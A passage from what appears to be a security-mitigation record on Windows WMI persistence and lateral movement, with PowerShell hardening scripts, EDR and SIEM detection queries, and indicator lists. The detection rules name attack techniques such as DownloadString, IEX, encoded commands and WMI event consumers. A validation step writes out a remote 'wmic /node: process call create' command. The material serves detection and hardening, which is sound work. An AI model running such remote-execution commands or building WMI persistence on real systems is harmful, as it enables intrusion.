Write-Host "`n[INFO] To deploy these settings via Group Policy:" -ForegroundColor Cyan
Write-Host "  1. Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options" -ForegroundColor Yellow
Write-Host "     - DCOM: Machine Access Restrictions = Restrict to Administrators" -ForegroundColor Yellow
Write-Host "     - DCOM: Machine Launch Restrictions = Restrict to Administrators" -ForegroundColor Yellow
Write-Host "  2. Computer Configuration > Policies > Administrative Templates > Windows Components > WMI" -ForegroundColor Yellow
Write-Host "     - Establish WMI Namespace Security = Enabled (configure ACLs)" -ForegroundColor Yellow
Write-Host "  3. Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy" -ForegroundColor Yellow
Write-Host "     - Object Access > Audit Other Object Access Events = Success and Failure" -ForegroundColor Yellow

Write-Host "`n[SUCCESS] WMI security hardening complete" -ForegroundColor Green
Write-Host "[INFO] Test remote WMI access to verify changes" -ForegroundColor Cyan

iso27001_controls: A.9.2.3 - Management of privileged access rights
A.9.1.2 - Access to networks and network services
nist_csf: PR.AC-4 - Access permissions and authorizations are managed
PR.PT-3 - The principle of least functionality is incorporated
PR.PT-4 - Communications and control networks are protected
validation_steps: Run hardening script with admin privileges: .\Harden-WMI.ps1
Test WMI namespace security: As standard user, try: Get-WmiObject -Namespace root\\subscription -Class __EventFilter (should fail with Access Denied)
Test remote WMI block: From another system: Get-WmiObject -Class Win32_OperatingSystem -ComputerName [target] (should fail unless from allowed subnet)
Verify DCOM settings: Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Ole' -Name LegacyAuthenticationLevel (should be 2)
Check firewall rules: Get-NetFirewallRule -DisplayGroup 'Windows Management Instrumentation (WMI)' | Select-Object DisplayName, RemoteAddress
Test monitoring task: Run manually: .\Monitor-WMISubscriptions.ps1, check Application event log for Event ID 9001
Create test subscription as admin, verify monitoring task detects it

mitigations.title: Implement PowerShell Constrained Language Mode and Script Block Logging
mitigations.description: Enable PowerShell Constrained Language Mode to restrict PowerShell capabilities, preventing WMI event subscription creation via Set-WmiInstance and New-CimInstance cmdlets. Enable Script Block Logging (Event ID 4104) to capture all PowerShell commands including WMI operations. Combine with PowerShell Transcription for comprehensive audit trail of WMI-based attacks.

code_example.code:
# PowerShell Hardening for WMI Attack Prevention
# Purpose: Enable Constrained Language Mode and comprehensive logging
# Requires: Administrator privileges, Windows PowerShell 5.0+
# Author: STRIDE-MCP Security Research

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "PowerShell Security Hardening for WMI" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# Check PowerShell version
$psVersion = $PSVersionTable.PSVersion
if ($psVersion.Major -lt 5) {
    Write-Host "[ERROR] PowerShell 5.0 or higher required. Current version: $psVersion" -ForegroundColor Red
    exit 1
}

Write-Host "[OK] PowerShell version: $psVersion" -ForegroundColor Green

# Enable Script Block Logging (captures all PowerShell commands)
Write-Host "`n[STEP 1] Enabling PowerShell Script Block Logging..." -ForegroundColor Cyan

$scriptBlockPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'
if (-not (Test-Path $scriptBlockPath)) {
    New-Item -Path $scriptBlockPath -Force | Out-Null
}

Set-ItemProperty -Path $scriptBlockPath -Name 'EnableScriptBlockLogging' -Value 1 -Type DWord
Set-ItemProperty -Path $scriptBlockPath -Name 'EnableScriptBlockInvocationLogging' -Value 1 -Type DWord

Write-Host "[SUCCESS] Script Block Logging enabled - Event ID 4104 in PowerShell Operational log" -ForegroundColor Green

# Enable PowerShell Module Logging
Write-Host "`n[STEP 2] Enabling PowerShell Module Logging..." -ForegroundColor Cyan

$moduleLoggingPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging'
if (-not (Test-Path $moduleLoggingPath)) {
    New-Item -Path $moduleLoggingPath -Force | Out-Null
}

Set-ItemProperty -Path $moduleLoggingPath -Name 'EnableModuleLogging' -Value 1 -Type DWord

# Log all modules (especially WMI-related: CimCmdlets, Microsoft.PowerShell.Management)
$moduleNamesPath = "$moduleLoggingPath\\ModuleNames"
if (-not (Test-Path $moduleNamesPath)) {
    New-Item -Path $moduleNamesPath -Force | Out-Null
}

Set-ItemProperty -Path $moduleNamesPath -Name '*' -Value '*' -Type String

Write-Host "[SUCCESS] Module Logging enabled for all PowerShell modules" -ForegroundColor Green

# Enable PowerShell Transcription (creates text transcript of all PowerShell sessions)
Write-Host "`n[STEP 3] Enabling PowerShell Transcription..." -ForegroundColor Cyan

$transcriptionPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription'
if (-not (Test-Path $transcriptionPath)) {
    New-Item -Path $transcriptionPath -Force | Out-Null
}

Set-ItemProperty -Path $transcriptionPath -Name 'EnableTranscripting' -Value 1 -Type DWord
Set-ItemProperty -Path $transcriptionPath -Name 'EnableInvocationHeader' -Value 1 -Type DWord

# Set transcript output directory (ensure proper ACLs to prevent attacker deletion)
$transcriptDir = 'C:\\PSTranscripts'
if (-not (Test-Path $transcriptDir)) {
    New-Item -Path $transcriptDir -ItemType Directory -Force | Out-Null
}

Set-ItemProperty -Path $transcriptionPath -Name 'OutputDirectory' -Value $transcriptDir -Type String

# Secure transcript directory (only SYSTEM and Administrators can access)
$acl = Get-Acl $transcriptDir
$acl.SetAccessRuleProtection($true, $false) # Disable inheritance

# Add SYSTEM Full Control
$systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    'SYSTEM', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'
)
$acl.AddAccessRule($systemRule)

# Add Administrators Full Control
$adminsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    'BUILTIN\\Administrators', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'
)
$acl.AddAccessRule($adminsRule)

Set-Acl -Path $transcriptDir -AclObject $acl

Write-Host "[SUCCESS] Transcription enabled - logs saved to: $transcriptDir" -ForegroundColor Green

# Enable Constrained Language Mode via AppLocker (most effective method)
Write-Host "`n[STEP 4] Configuring Constrained Language Mode via AppLocker..." -ForegroundColor Cyan

# Check if AppLocker service is available
$appIdService = Get-Service -Name AppIDSvc -ErrorAction SilentlyContinue
if ($appIdService) {
    Set-Service -Name AppIDSvc -StartupType Automatic
    Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue
    
    Write-Host "[INFO] AppLocker service enabled" -ForegroundColor Cyan
    Write-Host "[INFO] Deploy AppLocker policy via Group Policy to enforce Constrained Language Mode" -ForegroundColor Yellow
    Write-Host "       - Constrained Language Mode blocks: New-Object, Add-Type, Set-WmiInstance, Invoke-Expression" -ForegroundColor Yellow
    Write-Host "       - This prevents most PowerShell-based WMI persistence techniques" -ForegroundColor Yellow
} else {
    Write-Host "[WARNING] AppLocker not available (requires Windows Enterprise/Education edition)" -ForegroundColor Yellow
}

# Alternative: Environment variable method (less secure, easily bypassed)
# [System.Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
# Write-Host "[INFO] Constrained Language Mode set via environment variable (reboot required)" -ForegroundColor Yellow

# Configure Protected Event Logging (encrypts sensitive data in logs)
Write-Host "`n[STEP 5] Configuring PowerShell Protected Event Logging..." -ForegroundColor Cyan

# Protected Event Logging requires certificate for encryption
# Placeholder - implement certificate-based encryption for sensitive environments
Write-Host "[INFO] Protected Event Logging requires PKI certificate configuration" -ForegroundColor Yellow
Write-Host "       See: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows" -ForegroundColor Yellow

# Increase PowerShell log sizes
Write-Host "`n[STEP 6] Increasing PowerShell event log sizes..." -ForegroundColor Cyan

$psLogNames = @(
    'Microsoft-Windows-PowerShell/Operational',
    'Windows PowerShell'
)

foreach ($logName in $psLogNames) {
    try {
        $log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName
        $log.MaximumSizeInBytes = 1GB
        $log.SaveChanges()
        Write-Host "  - Increased log size: $logName (1 GB)" -ForegroundColor Green
    } catch {
        Write-Host "  - Failed to configure log: $logName" -ForegroundColor Red
    }
}

# Create detection rule for WMI-related PowerShell commands
Write-Host "`n[STEP 7] Creating sample detection query for WMI PowerShell abuse..." -ForegroundColor Cyan

$detectionQuery = @'
# PowerShell Script Block Logging - WMI Persistence Detection
# Run this query in your SIEM or locally via Get-WinEvent

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[EventID=4104]]' |
    Where-Object {
        $_.Message -match '__EventFilter' -or
        $_.Message -match '__EventConsumer' -or
        $_.Message -match '__FilterToConsumerBinding' -or
        $_.Message -match 'CommandLineEventConsumer' -or
        $_.Message -match 'ActiveScriptEventConsumer' -or
        $_.Message -match 'Set-WmiInstance.*root\\subscription' -or
        $_.Message -match 'New-CimInstance.*root/subscription' -or
        $_.Message -match 'Invoke-WmiMethod.*Win32_Process.*Create' -or
        $_.Message -match 'Get-WmiObject.*-ComputerName'
    } |
    Select-Object TimeCreated, @{Name='User';Expression={$_.UserId}}, Message |
    Format-Table -AutoSize
'@

$queryPath = "$env:USERPROFILE\\Desktop\\Detect-WMI-PowerShell.ps1"
$detectionQuery | Out-File -FilePath $queryPath -Force

Write-Host "[SUCCESS] Detection query saved to: $queryPath" -ForegroundColor Green

# Summary and validation
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "PowerShell Hardening Complete" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "`n[ENABLED FEATURES]" -ForegroundColor Cyan
Write-Host "  ✓ Script Block Logging (Event ID 4104)" -ForegroundColor Green
Write-Host "  ✓ Module Logging (all modules)" -ForegroundColor Green
Write-Host "  ✓ Transcription (output: $transcriptDir)" -ForegroundColor Green
Write-Host "  ✓ Event log sizes increased (1 GB)" -ForegroundColor Green

Write-Host "`n[NEXT STEPS]" -ForegroundColor Cyan
Write-Host "  1. Deploy via Group Policy for enterprise-wide enforcement" -ForegroundColor Yellow
Write-Host "     - Computer Configuration > Policies > Administrative Templates > Windows Components > Windows PowerShell" -ForegroundColor Yellow
Write-Host "  2. Configure AppLocker to enable Constrained Language Mode" -ForegroundColor Yellow
Write-Host "  3. Forward PowerShell logs to SIEM (Event IDs 4103, 4104, 4105, 4106)" -ForegroundColor Yellow
Write-Host "  4. Test detection: Run detection query script on Desktop" -ForegroundColor Yellow
Write-Host "  5. Create test WMI subscription and verify it's logged" -ForegroundColor Yellow

Write-Host "`n[INFO] Restart PowerShell session for changes to take effect" -ForegroundColor Cyan

tools.name: AppLocker
tools.type: Application Whitelisting for Constrained Language Mode

nist_csf: DE.AE-3 - Event data are collected and correlated
validation_steps: Run PowerShell hardening script: .\Harden-PowerShell.ps1
Verify Script Block Logging: Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging
Test logging: Run: Get-WmiObject -Class Win32_OperatingSystem
Check logs: Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[EventID=4104]]' -MaxEvents 5
Verify transcript created: dir C:\\PSTranscripts (should contain .txt files)
Test Constrained Language Mode (if AppLocker enabled): $ExecutionContext.SessionState.LanguageMode (should show 'ConstrainedLanguage')
Attempt WMI persistence in constrained mode: Set-WmiInstance -Namespace root\\subscription -Class __EventFilter ... (should fail)
Run detection query script to find WMI-related PowerShell activity

mitigations.title: Deploy EDR with WMI Behavioral Detection and Automated Response
mitigations.description: Implement Endpoint Detection and Response (EDR) solution with behavioral analytics specifically tuned for WMI abuse detection. Configure automated response actions to quarantine systems exhibiting WMI persistence creation, remote WMI execution patterns, or WMI-based lateral movement. Leverage EDR telemetry for threat hunting WMI event subscriptions across enterprise.

code_example.code:
// Microsoft Defender for Endpoint - WMI Persistence Detection Queries
// Author: STRIDE-MCP Security Research
// Purpose: Detect WMI event subscriptions, remote execution, and lateral movement

// Query 1: WMI Event Subscription Creation (Persistence)
DeviceEvents
| where ActionType in ("WmiBindingEventConsumerToFilter", "WmiEventConsumerCreation", "WmiEventFilterCreation")
| extend ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName)
| extend FilterName = tostring(parse_json(AdditionalFields).FilterName)
| extend Query = tostring(parse_json(AdditionalFields).Query)
| extend ConsumerType = tostring(parse_json(AdditionalFields).ConsumerType)
| extend CommandLineTemplate = tostring(parse_json(AdditionalFields).CommandLineTemplate)
| extend ScriptText = tostring(parse_json(AdditionalFields).ScriptText)
// Flag suspicious indicators
| extend IsSuspicious = 
    ConsumerName !startswith "Microsoft" and
    ConsumerName !startswith "Windows" and
    (
        CommandLineTemplate contains "powershell" or
        CommandLineTemplate contains "cmd.exe" or
        CommandLineTemplate contains "http" or
        CommandLineTemplate contains "mshta" or
        CommandLineTemplate contains "rundll32" or
        CommandLineTemplate contains "-enc" or
        CommandLineTemplate contains "-EncodedCommand" or
        ScriptText contains "DownloadString" or
        ScriptText contains "Invoke-Expression" or
        ScriptText contains "IEX" or
        Query contains "__InstanceModificationEvent" or
        Query contains "Win32_LocalTime" or
        Query contains "Win32_PerfFormattedData"
    )
| where IsSuspicious == true
| project Timestamp, DeviceName, AccountName, ActionType, ConsumerName, FilterName, Query, CommandLineTemplate, ScriptText, ConsumerType
| order by Timestamp desc


// Query 2: WMI Remote Execution and Lateral Movement
DeviceProcessEvents
| where FileName =~ "wmic.exe" or
        FileName =~ "WmiPrvSE.exe" or
        FileName =~ "scrcons.exe"
// Detect remote WMI execution patterns
| extend IsRemoteWMI = 
    ProcessCommandLine contains "/node:" or
    ProcessCommandLine contains "/NODE:" or
    ProcessCommandLine contains "-ComputerName" or
    ProcessCommandLine contains "Win32_Process" or
    ProcessCommandLine contains "process call create"
| extend IsSuspiciousParent = 
    InitiatingProcessFileName =~ "WmiPrvSE.exe" or
    InitiatingProcessFileName =~ "scrcons.exe"
| extend IsSuspiciousChild =
    FileName in~ ("powershell.exe", "cmd.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "wscript.exe", "cscript.exe")
| where IsRemoteWMI == true or
        IsSuspiciousParent == true or
        (InitiatingProcessFileName =~ "WmiPrvSE.exe" and IsSuspiciousChild == true)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc


// Query 3: WMI Network Connections (Remote Access)
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "WmiPrvSE.exe" or
        InitiatingProcessFileName =~ "Winmgmt.exe"
| where RemotePort in (135, 5985, 5986) or
        (RemotePort >= 49152 and RemotePort <= 65535) // Dynamic RPC ports
| extend IsOutbound = RemoteIPType == "Public" or RemoteIPType == "External"
| extend IsLateralMovement = 
    RemoteIPType == "Private" and
    RemoteIP startswith "10." or RemoteIP startswith "172." or RemoteIP startswith "192.168."
| where IsOutbound == true or IsLateralMovement == true
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, ActionType, InitiatingProcessCommandLine
| order by Timestamp desc


// Query 4: Detect MOF File Compilation (Advanced Persistence)
DeviceProcessEvents
| where FileName =~ "mofcomp.exe"
| extend IsSuspiciousMOF = 
    ProcessCommandLine contains ".mof" and
    (
        ProcessCommandLine !contains "C:\\Windows\\System32" or
        ProcessCommandLine contains "subscription" or
        ProcessCommandLine contains "__EventFilter" or
        ProcessCommandLine contains "__EventConsumer"
    )
| where IsSuspiciousMOF == true
| join kind=inner (
    DeviceFileEvents
    | where FileName endswith ".mof"
    | where FolderPath !startswith "C:\\Windows\\System32"
) on DeviceId
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, FileName, FileSize, SHA256
| order by Timestamp desc


// Query 5: Hunt for existing WMI persistence across estate
// Note: This query uses custom detection - adapt for your EDR platform
DeviceEvents
| where ActionType == "WmiEventConsumerCreation"
| summarize 
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp),
    DeviceCount = dcount(DeviceName),
    Devices = make_set(DeviceName)
    by ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName),
       ConsumerType = tostring(parse_json(AdditionalFields).ConsumerType),
       CommandLineTemplate = tostring(parse_json(AdditionalFields).CommandLineTemplate)
| where DeviceCount >= 3 // Flag subscriptions on multiple devices (potential malware spread)
| order by DeviceCount desc


// Query 6: PowerShell WMI abuse correlation
DeviceEvents
| where ActionType in ("WmiEventConsumerCreation", "WmiEventFilterCreation", "WmiBindingEventConsumerToFilter")
| project Timestamp, DeviceId, DeviceName, AccountName, WmiActionType = ActionType, ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName)
| join kind=inner (
    DeviceEvents
    | where ActionType == "PowerShellCommand"
    | where AdditionalFields contains "Set-WmiInstance" or
            AdditionalFields contains "New-CimInstance" or
            AdditionalFields contains "__EventFilter" or
            AdditionalFields contains "root\\subscription"
    | project Timestamp1 = Timestamp, DeviceId, PowerShellCommand = tostring(parse_json(AdditionalFields).Command)
) on DeviceId
| where abs(datetime_diff('minute', Timestamp, Timestamp1)) <= 5 // WMI creation within 5 min of PowerShell command
| project Timestamp, DeviceName, AccountName, WmiActionType, ConsumerName, PowerShellCommand
| order by Timestamp desc


// Automated Response Configuration (Microsoft Defender for Endpoint)
// Create Custom Detection Rule:
// 1. Navigate to: Settings > Endpoints > Rules > Custom Detection Rules
// 2. Create new rule with Query 1 or Query 2 above
// 3. Configure automated response actions:
//    - Isolate machine (for critical systems)
//    - Collect investigation package
//    - Run antivirus scan
//    - Initiate automated investigation
//    - Send email alert to SOC
// 4. Set severity: High
// 5. Set MITRE ATT&CK mapping: T1546.003, T1047, T1021.006


// Alternative EDR Platforms - Pseudo-queries:

/*
// CrowdStrike Falcon (Splunk-style query)
index=crowdstrike sourcetype=ProcessRollup2
(ImageFileName="*\\WmiPrvSE.exe" OR ImageFileName="*\\wmic.exe")
| eval is_suspicious=if(
    match(CommandLine, "(?i)(powershell|cmd\\.exe|__EventFilter|__EventConsumer|Win32_Process|/node:)"),
    1, 0)
| where is_suspicious=1
| table _time, ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName
| sort -_time


// SentinelOne (Visibility/XQL query)
DataSource IN [PROCESS, NETWORK]
WHERE (
    ProcessName IN ["WmiPrvSE.exe", "wmic.exe", "mofcomp.exe", "scrcons.exe"]
    OR ProcessCommandLine ContainsCIS "__EventFilter"
    OR ProcessCommandLine ContainsCIS "__EventConsumer"
    OR ProcessCommandLine ContainsCIS "/node:"
)
AND (
    ProcessCommandLine ContainsCIS "powershell"
    OR ProcessCommandLine ContainsCIS "cmd.exe"
    OR NetConnectionDirection = "OUTGOING"
)


// Carbon Black (Custom Threat Hunt)
process_name:(WmiPrvSE.exe OR wmic.exe OR scrcons.exe OR mofcomp.exe)
AND (process_cmdline:(*__EventFilter* OR *__EventConsumer* OR *Win32_Process* OR */node:*))
*/


// Threat Hunting Guide:
// 1. Run Query 5 weekly to identify persistent WMI subscriptions across enterprise
// 2. Baseline legitimate WMI usage in your environment (IT management tools)
// 3. Create allowlist for known-good WMI consumers (e.g., SCCM, monitoring agents)
// 4. Alert on any new WMI subscriptions not in allowlist
// 5. Correlate WMI events with:
//    - Recent phishing campaigns (initial access)
//    - Privilege escalation attempts
//    - Credential theft (Mimikatz, etc.)
//    - Lateral movement indicators (SMB, RDP, PSExec)
// 6. Investigate accounts used for remote WMI - should be service accounts or admins only

iso27001_controls: A.16.1.4 - Assessment of information security events
A.16.1.5 - Response to information security incidents
nist_csf: DE.AE-5 - Incident alert thresholds are established
DE.CM-7 - Monitoring for unauthorized activity is continuous
validation_steps: Deploy EDR agent to test systems
Import custom detection rules (KQL queries above)
Configure automated response actions in EDR console
Test detection: Create WMI event subscription using PowerShell (see attack scenario)
Verify EDR alert generated within 1-5 minutes
Check automated response actions executed (isolation, investigation, etc.)
Run threat hunting queries (Query 5) to establish baseline of WMI usage
Create allowlist for legitimate WMI consumers in your environment
Test remote WMI detection: Execute wmic /node:[remote-host] process call create "calc.exe"
Verify lateral movement alert and investigate timeline in EDR console

indicators: Sysmon Event ID 19 (WmiEventFilter activity detected) - creation of WMI event filter
Sysmon Event ID 20 (WmiEventConsumer activity detected) - creation of WMI event consumer
Sysmon Event ID 21 (WmiEventConsumerToFilter activity detected) - binding of filter to consumer
Windows Event ID 5857-5861 (WMI-Activity/Operational log) - WMI activity and errors
Process creation: WmiPrvSE.exe spawning suspicious child processes (cmd.exe, powershell.exe, mshta.exe, rundll32.exe)
Process creation: scrcons.exe (WMI Standard Event Consumer) executing CommandLineEventConsumer payloads
Network connections from WmiPrvSE.exe to external IPs or internal lateral movement targets (port 135, 5985/5986, dynamic RPC 49152-65535)
PowerShell commands containing: Set-WmiInstance, New-CimInstance, __EventFilter, __EventConsumer, __FilterToConsumerBinding, root\\subscription
WMIC.exe commands containing: /node:, process call create, __EventFilter, __EventConsumer
MOF file compilation: mofcomp.exe executing with .mof files outside of C:\\Windows\\System32
WMI event subscription names with high entropy or mimicking Windows components (e.g., 'BfeOnServiceStartTypeChange', 'WindowsUpdateCheck')
Remote authentication to DCOM (port 135) or WinRM (5985/5986) followed by wmiprvse.exe execution
WMI queries for reconnaissance: Win32_ComputerSystem, Win32_OperatingSystem, Win32_Process, Win32_UserAccount via remote systems
log_sources: Sysmon Event ID 19, 20, 21 (WMI event subscription activity)
Sysmon Event ID 1 (Process creation - WmiPrvSE.exe, scrcons.exe, wmic.exe, mofcomp.exe)
Sysmon Event ID 3 (Network connections - WMI remote access)
PowerShell Operational Log Event ID 4103, 4104 (Script Block Logging)
EDR telemetry (process, network, WMI event subscription tracking)
Windows Firewall logs (connections to DCOM/WinRM ports)
Active Directory authentication logs (remote WMI access using domain credentials)

log_queries.query:
// Detect WMI persistence via event subscriptions
SysmonEvent
| where EventID in (19, 20, 21) // WMI event filter, consumer, binding
| extend EventType = case(
    EventID == 19, "WmiEventFilter",
    EventID == 20, "WmiEventConsumer",
    EventID == 21, "WmiEventConsumerToFilter",
    "Unknown"
)
| extend ConsumerType = tostring(parse_xml(EventData).DataItem.EventData.Data[4].'#text')
| extend ConsumerName = tostring(parse_xml(EventData).DataItem.EventData.Data[2].'#text')
| extend FilterName = tostring(parse_xml(EventData).DataItem.EventData.Data[2].'#text')
| extend Query = tostring(parse_xml(EventData).DataItem.EventData.Data[5].'#text')
// Flag suspicious patterns
| extend IsSuspicious = 
    ConsumerName !startswith "Microsoft" and
    ConsumerName !startswith "Windows" and
    (
        Query contains "__InstanceModificationEvent" or
        Query contains "Win32_LocalTime" or
        Query contains "Win32_PerfFormattedData" or
        ConsumerType == "CommandLineEventConsumer" or
        ConsumerType == "ActiveScriptEventConsumer"
    )
| where IsSuspicious == true
| project TimeGenerated, Computer, User, EventType, ConsumerName, FilterName, Query, ConsumerType
| order by TimeGenerated desc

index=windows sourcetype="WinEventLog:Sysmon" (EventCode=19 OR EventCode=20 OR EventCode=21)
| rex field=_raw "Consumer=\"(?<ConsumerName>[^\"]+)\""
| rex field=_raw "Filter=\"(?<FilterName>[^\"]+)\""
| rex field=_raw "Query=\"(?<Query>[^\"]+)\""
| eval is_suspicious=if(
    (NOT match(ConsumerName, "(?i)(Microsoft|Windows)")) AND
    (match(Query, "(?i)(__InstanceModificationEvent|Win32_LocalTime|Win32_PerfFormattedData)") OR
     match(_raw, "(?i)(CommandLineEventConsumer|ActiveScriptEventConsumer)")),
    1, 0)
| where is_suspicious=1
| table _time, Computer, User, EventCode, ConsumerName, FilterName, Query
| sort -_time

// WMI event subscription creation sequence
sequence by host.name with maxspan=5m
  [process where event.code == "1" and 
   process.name == "powershell.exe" and
   (process.command_line like "*Set-WmiInstance*root\\subscription*" or
    process.command_line like "*New-CimInstance*root/subscription*" or
    process.command_line like "*__EventFilter*")]
  [any where event.provider == "Microsoft-Windows-Sysmon" and
   event.code in ("19", "20", "21")]
  [process where event.code == "1" and
   process.parent.name == "WmiPrvSE.exe" and
   process.name in ("cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe")]

log_queries.siem: Microsoft Sentinel (KQL) - Remote WMI Lateral Movement
log_queries.query:
// Detect remote WMI execution for lateral movement
let RemoteWMI = 
    SecurityEvent
    | where EventID == 4688 // Process creation
    | where NewProcessName endswith "\\\\wmic.exe" or
            NewProcessName endswith "\\\\WmiPrvSE.exe"
    | where CommandLine contains "/node:" or
            CommandLine contains "/NODE:" or
            CommandLine contains "Win32_Process" or
            CommandLine contains "process call create"
    | extend TargetHost = extract(@"/[Nn][Oo][Dd][Ee]:([^\\s]+)", 1, CommandLine)
    | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, TargetHost;
let WMINetworkConnections =
    SysmonEvent
    | where EventID == 3 // Network connection
    | where Image endswith "\\\\WmiPrvSE.exe"
    | where DestinationPort in (135, 5985, 5986) or
            (DestinationPort >= 49152 and DestinationPort <= 65535)
    | extend IsPrivateIP = 
            DestinationIp startswith "10." or
            DestinationIp startswith "172." or
            DestinationIp startswith "192.168."
    | where IsPrivateIP == true
    | project TimeGenerated, Computer, User, DestinationIp, DestinationPort, Image;
RemoteWMI
| join kind=inner (
    WMINetworkConnections
) on Computer
| where TimeGenerated between ((TimeGenerated1 - 2m) .. (TimeGenerated1 + 2m))
| project TimeGenerated, Computer, Account, CommandLine, TargetHost, DestinationIp, DestinationPort
| order by TimeGenerated desc
